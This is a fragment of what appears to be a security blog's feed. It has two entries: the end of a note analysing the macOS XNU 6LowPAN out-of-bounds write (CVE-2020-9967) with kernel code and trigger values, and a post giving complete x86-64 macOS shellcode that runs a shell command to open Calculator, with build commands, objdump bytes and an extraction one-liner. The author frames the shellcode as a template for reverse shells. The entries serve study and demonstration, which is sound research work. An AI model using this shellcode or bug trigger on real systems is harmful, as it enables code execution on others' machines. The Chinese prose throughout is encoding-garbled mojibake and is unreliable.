class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 6lowpan input routine.</span></span><br><span class="line"><span class="comment"> * Decapsulate the 802.15.4 Data Frame</span></span><br><span class="line"><span class="comment"> * Header decompression on the payload</span></span><br><span class="line"><span class="comment"> * Pass the mbuf to the IPV6 protocol stack using proto_input()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sixlowpan_input(<span class="keyword">ifnet_t</span> p, __unused <span class="keyword">protocol_family_t</span> protocol,</span><br><span class="line">    <span class="keyword">mbuf_t</span> m, __unused <span class="keyword">char</span> *frame_header)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">frame802154_t</span>      ieee02154hdr;</span><br><span class="line">    <span class="keyword">u_int8_t</span>           *payload = <span class="literal">NULL</span>;</span><br><span class="line">    if6lpan_ref        ifl = <span class="literal">NULL</span>;</span><br><span class="line">    bpf_packet_func    bpf_func;</span><br><span class="line">    <span class="keyword">mbuf_t</span> mc, m_temp;</span><br><span class="line">    <span class="keyword">int</span> off, err = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int16_t</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an mbuf cluster for the 802.15.4 frame and uncompressed payload */</span></span><br><span class="line">    mc = m_getcl(M_WAITOK, MT_DATA, M_PKTHDR);</span><br><span class="line">    <span class="keyword">if</span> (mc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;len, mtod(m, <span class="keyword">u_int8_t</span> *), <span class="keyword">sizeof</span>(<span class="keyword">u_int16_t</span>));</span><br><span class="line">    len = ntohs(len);**                     <span class="comment">// This is the size read from the frame on the wire. </span></span><br><span class="line">    m_adj(m, <span class="keyword">sizeof</span>(<span class="keyword">u_int16_t</span>));</span><br><span class="line">    <span class="comment">/* Copy the compressed 802.15.4 payload from source mbuf to allocated cluster mbuf */</span></span><br><span class="line">    <span class="keyword">for</span> (m_temp = m, off = <span class="number">0</span>; m_temp != <span class="literal">NULL</span>; m_temp = m_temp-&gt;m_next) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m_temp-&gt;m_len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            m_copyback(mc, off, m_temp-&gt;m_len, mtod(m_temp, <span class="keyword">void</span> *));</span><br><span class="line">            off += m_temp-&gt;m_len;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = p_6lowpan_ifnet;</span><br><span class="line">    mc-&gt;m_pkthdr.rcvif = p;</span><br><span class="line"></span><br><span class="line">    sixlowpan_lock();</span><br><span class="line">    ifl = ifnet_get_if6lpan_retained(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ifl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        sixlowpan_unlock();</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (if6lpan_flags_ready(ifl) == <span class="number">0</span>) &#123;</span><br><span class="line">        if6lpan_release(ifl);</span><br><span class="line">        sixlowpan_unlock();</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bpf_func = ifl-&gt;if6lpan_bpf_input;</span><br><span class="line">    sixlowpan_unlock();</span><br><span class="line">    if6lpan_release(ifl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bpf_func) &#123;</span><br><span class="line">        bpf_func(p, mc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the 802.15.4 frame header */</span></span><br><span class="line">    bzero(&amp;ieee02154hdr, <span class="keyword">sizeof</span>(ieee02154hdr));</span><br><span class="line">    frame802154_parse(mtod(mc, <span class="keyword">uint8_t</span> *), len, &amp;ieee02154hdr, &amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XXX Add check for your link layer address being dest */</span></span><br><span class="line">    sixxlowpan_input(&amp;ieee02154hdr, payload);</span><br></pre></td></tr></table></figure><ol><li><code>m_getcl</code> åˆ†é…mc(mbuf cluster)æ¥å­˜æ”¾è¦å¤„ç†çš„ 802.15.4 få¸§å’Œæœªè§£å‹çš„payload</li><li>æ‹·è´æœªè§£å‹çš„802.15.4 payload åˆ°æ–°åˆ†é…çš„mcä¸­</li></ol><p>len æ˜¯ä»å‚æ•° mbuf m ä¸­è¯»å–å¾—åˆ°çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯æ§çš„å€¼ï¼Œåœ¨åé¢è§£æé€»è¾‘: <strong><code>frame802154_parse</code> ï¼Œè¿™ä¸ªé•¿åº¦æ˜¯ç›´æ¥ä½¿ç”¨çš„ã€‚</strong></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%2015.png" alt="CodeQL%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2015.png"></p><p>å› ä¸ºæˆ‘ä»¬å¯ä»¥å°†lenæ§åˆ¶åœ¨0-0xffffä¹‹é—´ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿pf-&gt;payload_lenä¸ºè´Ÿå€¼(to-header len)ï¼Œå°äºé¢„æœŸçš„å¤§å°ï¼Œæˆ–è€…å¤§äºmcä¸­è¾“å…¥æ•°æ®æœ¬èº«çš„å¤§å°ã€‚</p><p>éšåçš„è°ƒç”¨æ˜¯ <strong><code>sixxlowpan_input(&amp;ieee02154hdr, payload);</code></strong> </p><p>è¿™ä¸ªå‡½æ•°ç›´æ¥ä½¿ç”¨äº† ä¹‹å‰è§£æå‡ºæ¥çš„pf å’Œ payloadã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">errno_t</span></span><br><span class="line">sixxlowpan_input(struct frame802154 *ieee02154hdr, <span class="keyword">u_int8_t</span> *payload)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">errno_t</span> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    error = sixxlowpan_uncompress(ieee02154hdr, payload);</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * TO DO: fragmentation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åèµ°åˆ° <code>sixxlowpan_uncompress</code> å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">errno_t</span></span><br><span class="line">sixxlowpan_uncompress(struct frame802154 ***ieee02154hdr**, <span class="keyword">u_int8_t</span> *payload)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">long</span> hdroffset;</span><br><span class="line">    <span class="keyword">size_t</span> hdrlen;</span><br><span class="line">    <span class="keyword">u_int8_t</span> hdrbuf[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">errno_t</span> error;</span><br><span class="line"></span><br><span class="line">    bzero(hdrbuf, <span class="keyword">sizeof</span>(hdrbuf));</span><br><span class="line">    hdrlen = <span class="keyword">sizeof</span>(hdrbuf);</span><br><span class="line"></span><br><span class="line">    error = uncompress_hdr_hc1(ieee02154hdr, (<span class="keyword">u_int8_t</span> *)payload,</span><br><span class="line">        <span class="number">0</span>, &amp;hdroffset, &amp;hdrlen, hdrbuf); <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (error != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hdroffset &lt; <span class="number">0</span>) &#123; <span class="comment">// 1</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * hdroffset negative means that we have to remove</span></span><br><span class="line"><span class="comment">         * hdrlen of extra stuff</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        memmove(&amp;payload[<span class="number">0</span>],</span><br><span class="line">            &amp;payload[hdrlen],</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdrlen);</span><br><span class="line">        ieee02154hdr-&gt;payload_len -= hdrlen;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * hdroffset is the size of the compressed header</span></span><br><span class="line"><span class="comment">         * -- i.e. when the untouched data starts</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * hdrlen is the size of the decompressed header</span></span><br><span class="line"><span class="comment">         * that takes the place of compressed header of size hdroffset</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        memmove(payload + hdrlen,</span><br><span class="line">            payload + hdroffset,</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdroffset); <span class="comment">// 2ï¼Œ oob write here, `ieee02154hdr-&gt; payload_len-3 = -2`</span></span><br><span class="line">        <span class="built_in">memcpy</span>(payload, hdrbuf, hdrlen);</span><br><span class="line">        ieee02154hdr-&gt;payload_len += hdrlen - hdroffset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å°†æ¥æ”¶åˆ°çš„å¸§çš„lenè®¾ç½®ä¸º0x4ï¼Œåˆ™æœ€ç»ˆå°†è®¡ç®—å‡ºä»¥ä¸‹å€¼(<code>frame802154_parse</code>)ï¼š</p><p><code>c</code> header length = 3 </p><p><code>frame-&gt;payload_len</code>= 1</p><p>åŒæ—¶ï¼Œåœ¨<code>uncompress_hdr_hc1</code>å‡½æ•°ä¸­ï¼ˆat 0)ï¼Œæ§åˆ¶æµç¨‹èµ°åˆ° <code>SICSLOWPAN_HC1_NH_UDP</code> åˆ†æ”¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*hdroffset &#x3D; SICSLOWPAN_HC1_HDR_LEN;  --&gt; *hdroffset &#x3D; 3</span><br><span class="line">*hdrlen &#x3D; UIP_IPH_LEN;                --&gt; *hdrlen &#x3D; 40</span><br><span class="line">sizeof(struct ip6_hdr) &#x3D; 40</span><br></pre></td></tr></table></figure><p>å†å›åˆ°ä¸Šå±‚å‡½æ•°<code>sixxlowpan_uncompress</code> (at 1)ï¼Œhdroffset ä¸º3ï¼Œèµ°ä¸‹é¢çš„åˆ†æ”¯ï¼Œèƒ½å¤Ÿèµ°åˆ° memmoveè°ƒç”¨(at 2)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memmove(payload + hdrlen,</span><br><span class="line">            payload + hdroffset,</span><br><span class="line">            ieee02154hdr-&gt;payload_len - hdroffset);</span><br></pre></td></tr></table></figure><p>where : payload + 40</p><p>what :  source payload buffer, å¯æ§</p><p>length : ieee02154hdr-&gt;payload_len - hdroffset å³ payload_len - hdroffset = 1 - 3 = -2</p><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">Building XNU for macOS Big Sur 11.0.1 (Intel)</a></p><p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/codeql_xnu.md">D4rkD0g/boringforever</a></p><p><a href="https://securitylab.github.com/research/apple-xnu-icmp-error-CVE-2018-4407">Kernel crash caused by out-of-bounds write in Appleâ€™s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab</a></p><p><a href="https://alexplaskett.github.io/CVE-2020-9967/">CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Basic&quot;&gt;&lt;a href=&quot;#Basic&quot; class=&quot;headerlink&quot; title=&quot;Basic&quot;&gt;&lt;/a&gt;Basic&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;æœ¬æ–‡å±äºå­¦ä¹ è¿‡ç¨‹ä¸­çš„ç¬”è®°ï¼ŒåŸºæœ¬ä¸Šæ˜¯æŠŠç°æœ‰çš„ç›¸å…³èµ„æ–™æ•´åˆåˆ°ä¸€èµ·ï¼Œé˜…è¯»å·²æœ‰åšå®¢/æ–‡ç« å¹¶å¤ç°ï¼ŒåŠ å…¥ä¸€äº›è‡ªå·±çš„æƒ³æ³•åè®°å½•ä¸‹æ¥çš„äº§ç‰©ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;build XNU è¿‡ç¨‹æ¥è‡ªæŸå¤§ä½¬çš„åšå®¢ï¼Œ&lt;code&gt;build xnu with codeql&lt;/code&gt;è¿‡ç¨‹æ¥è‡ª&lt;code&gt;github&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ç¬”è®°" scheme="http://o0xmuhe.me/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="XNU" scheme="http://o0xmuhe.me/tags/XNU/"/>
    
    <category term="CodeQL" scheme="http://o0xmuhe.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>SHELLCODE on macOS</title>
    <link href="http://o0xmuhe.me/2020/11/28/shell-code-on-macos/"/>
    <id>http://o0xmuhe.me/2020/11/28/shell-code-on-macos/</id>
    <published>2020-11-27T16:25:17.000Z</published>
    <updated>2020-11-27T17:08:29.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shellcode-on-macOS"><a href="#shellcode-on-macOS" class="headerlink" title="shellcode on macOS"></a>shellcode on macOS</h2><p>æœ€è¿‘å› ä¸ºä¸€äº›å·¥ä½œä¸Šçš„éœ€æ±‚éœ€è¦æä¸‹macOSä¸Šçš„shellcdoeï¼Œè°·æ­Œäº†å¾ˆå¤šèµ„æ–™/ä»£ç åå‘ç°è¿˜æ˜¯æœ‰ä¸å°‘å‘çš„ï¼Œæˆ–è€…å°±æ˜¯ä»£ç æ¯”è¾ƒè€ï¼Œå®šåˆ¶åŒ–ç¨‹åº¦æ¯”è¾ƒé«˜ï¼Œä¸å¤ªç¬¦åˆæˆ‘çš„éœ€æ±‚ï¼Œå…¶å®æˆ‘éœ€æ±‚ä¹Ÿç®€å• pop calcæˆ–è€…reverse shellï¼Œå°±æ˜¯ä¸ªæ¼”ç¤ºæ•ˆæœ ğŸ¤£ã€‚</p><a id="more"></a><h2 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h2><p>æˆ‘è¿™é‡Œç¯å¢ƒæ˜¯ macOS big sur(å¯¹ï¼Œæ²¡é”™ï¼Œå°ç™½é¼ ğŸ)</p><p>å·¥å…·é“¾åŸºæœ¬éƒ½æ˜¯brewç›´æ¥è£…æˆ–è€…è‡ªå¸¦çš„ã€‚</p><h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p>å…¶å®åœ¨macOSä¸Šå†™shellcodeå’ŒLinuxå·®ä¸å¤šï¼Œéƒ½æ˜¯è¦èµ°ç³»ç»Ÿè°ƒç”¨ï¼Œå¤§æ¦‚å°±æ˜¯å¸ƒç½®å‚æ•°ï¼Œå†™å¥½è°ƒç”¨å·ï¼Œç„¶åä¸€ä¸ªsyscallè¿›å»å³å¯ã€‚</p><p>æˆ‘è¿™é‡Œä¸ºäº†çœäº‹å„¿ï¼Œåšçš„æ˜¯æ‰§è¡Œ<code>system(&#39;xxxxxx&#39;)</code>çš„shellcodeï¼Œè¿™æ ·å¯¹äºæˆ‘æ¼”ç¤ºæ¥è¯´ï¼Œä¸ç®¡æ˜¯å¼¹è®¡ç®—å™¨è¿˜æ˜¯åå¼¹shelléƒ½æ¯”è¾ƒç®€å•ï¼Œå¦‚æœæ˜¯å®æˆ˜å•¥çš„ï¼Œå»ºè®®å‚è€ƒå¾ˆæ—©ä¹‹å‰hacking teamæ³„æ¼é‚£ç§ç©æ³•ï¼Œä¸è¿‡æ ¸å¿ƒåŸç†éƒ½æ˜¯é‚£æ ·ï¼Œä¸è¿‡äººå®¶ç©çš„æ¯”è¾ƒé«˜çº§(æ¯•ç«Ÿå†›ç«å˜›)ã€‚</p><p>exec_calc.asm: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">BITS 64</span><br><span class="line"></span><br><span class="line">global start</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    xor     rax, rax</span><br><span class="line">    mov     rax,0x2</span><br><span class="line">    ror     rax, 0x28</span><br><span class="line">    or      rax, 59</span><br><span class="line">    mov rcx, rax</span><br><span class="line"></span><br><span class="line">    xor     rdx, rdx</span><br><span class="line">    mov     rbx, 0x68732f2f6e69622f</span><br><span class="line">    push    rdx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rdi</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    mov     rbx, 0x632d</span><br><span class="line">    push    rdx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rbx</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    </span><br><span class="line">    ; å‚æ•°å¼€å§‹</span><br><span class="line">    mov rcx, 0x7070612e726f7461</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x6c75636c61432f73</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x6e6f69746163696c</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x7070412f6d657473</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x79532f206e65706f</span><br><span class="line">    push rcx</span><br><span class="line">    ; å‚æ•°ç»“æŸ</span><br><span class="line">    </span><br><span class="line">    push rsp</span><br><span class="line">    pop rcx</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    push    rcx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rdi</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rsi</span><br><span class="line"></span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>å…¶å®æ ¸å¿ƒçš„å°±æ˜¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œå³å­—ç¬¦ä¸²æ€ä¹ˆæ„é€ è¿›å»ï¼Œè¿™é‡Œæ˜¯éƒ½å‹åˆ°æ ˆé‡Œç„¶åä¼ é€’ä¸ªæŒ‡é’ˆï¼Œå¸¸è§„æ“ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f macho64 -o exec_calc.o exec_calc.asm</span><br><span class="line">$ ld -macosx_version_min 10.7.0 -o exec_calc exec_calc.o</span><br><span class="line">ld: warning: building <span class="keyword">for</span> macOS 10.7.0 is deprecated</span><br></pre></td></tr></table></figure><p>ç„¶åä»objdumpçš„ç»“æœä¸­æå–å­—èŠ‚ç å³å¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d ./exec_calc.o</span><br><span class="line"></span><br><span class="line">./exec_calc.o:file format Mach-O 64-bit x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section __TEXT,__text:</span><br><span class="line"></span><br><span class="line">0000000000000000 start:</span><br><span class="line">       0: 48 31 c0                     xorq%rax, %rax</span><br><span class="line">       3: b8 02 00 00 00               movl<span class="variable">$2</span>, %eax</span><br><span class="line">       8: 48 c1 c8 28                  rorq<span class="variable">$40</span>, %rax</span><br><span class="line">       c: 48 83 c8 3b                  orq<span class="variable">$59</span>, %rax</span><br><span class="line">      10: 48 89 c1                     movq%rax, %rcx</span><br><span class="line">      13: 48 31 d2                     xorq%rdx, %rdx</span><br><span class="line">      16: 48 bb 2f 62 69 6e 2f 2f 73 68movabsq<span class="variable">$7526411283028599343</span>, %rbx</span><br><span class="line">      20: 52                           pushq%rdx</span><br><span class="line">      21: 53                           pushq%rbx</span><br><span class="line">      22: 54                           pushq%rsp</span><br><span class="line">      23: 5f                           popq%rdi</span><br><span class="line">      24: 52                           pushq%rdx</span><br><span class="line">      25: bb 2d 63 00 00               movl<span class="variable">$25389</span>, %ebx</span><br><span class="line">      2a: 52                           pushq%rdx</span><br><span class="line">      2b: 53                           pushq%rbx</span><br><span class="line">      2c: 54                           pushq%rsp</span><br><span class="line">      2d: 5b                           popq%rbx</span><br><span class="line">      2e: 52                           pushq%rdx</span><br><span class="line">      2f: 48 b9 61 74 6f 72 2e 61 70 70movabsq<span class="variable">$8102082581755819105</span>, %rcx</span><br><span class="line">      39: 51                           pushq%rcx</span><br><span class="line">      3a: 48 b9 73 2f 43 61 6c 63 75 6cmovabsq<span class="variable">$7815262045510774643</span>, %rcx</span><br><span class="line">      44: 51                           pushq%rcx</span><br><span class="line">      45: 48 b9 6c 69 63 61 74 69 6f 6emovabsq<span class="variable">$7957695015157983596</span>, %rcx</span><br><span class="line">      4f: 51                           pushq%rcx</span><br><span class="line">      50: 48 b9 73 74 65 6d 2f 41 70 70movabsq<span class="variable">$8102047401594156147</span>, %rcx</span><br><span class="line">      5a: 51                           pushq%rcx</span><br><span class="line">      5b: 48 b9 6f 70 65 6e 20 2f 53 79movabsq<span class="variable">$8742383117993865327</span>, %rcx</span><br><span class="line">      65: 51                           pushq%rcx</span><br><span class="line">      66: 54                           pushq%rsp</span><br><span class="line">      67: 59                           popq%rcx</span><br><span class="line">      68: 52                           pushq%rdx</span><br><span class="line">      69: 51                           pushq%rcx</span><br><span class="line">      6a: 53                           pushq%rbx</span><br><span class="line">      6b: 57                           pushq%rdi</span><br><span class="line">      6c: 54                           pushq%rsp</span><br><span class="line">      6d: 5e                           popq%rsi</span><br><span class="line">      6e: 0f 05                        syscall</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ­¥è§ä»è§æ™ºäº†ï¼Œæœ‰å¤§ä½¬ç”¨bashä¸€è¡Œæå®šï¼Œè€Œæˆ‘æ¯”è¾ƒèœï¼Œä¹‹å‰æ˜¯å†™äº†ä¸ªpyè„šæœ¬æå–ç„¶åæ ¼å¼åŒ–è¾“å‡ºçš„ã€‚</p><p>ä¹‹å‰çœ‹åˆ°è¿‡ä¸€ä¸ªLinuxç‰ˆæœ¬çš„ä¸€é”®æå–ï¼Œä¸è¿‡æ„Ÿè§‰å¤ªå¤æ‚äº†â€¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./execve-stack|grep <span class="string">'[0-9a-f]:'</span>|grep -v <span class="string">'file'</span>|cut -f2 -d:|cut -f1-6 -d<span class="string">' '</span>|tr -s <span class="string">' '</span>|tr <span class="string">'\t'</span> <span class="string">' '</span>|sed <span class="string">'s/ $//g'</span>|sed <span class="string">'s/ /\\x/g'</span>|paste -d <span class="string">''</span> -s |sed <span class="string">'s/^/"/'</span>|sed <span class="string">'s/$/"/g'</span></span><br></pre></td></tr></table></figure><p>æœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥æä¸ªmacOSç‰ˆæœ¬ğŸ¤£</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://modexp.wordpress.com/2017/01/21/shellcode-osx/">shellcode-osx</a></p>]]></content>
    
    
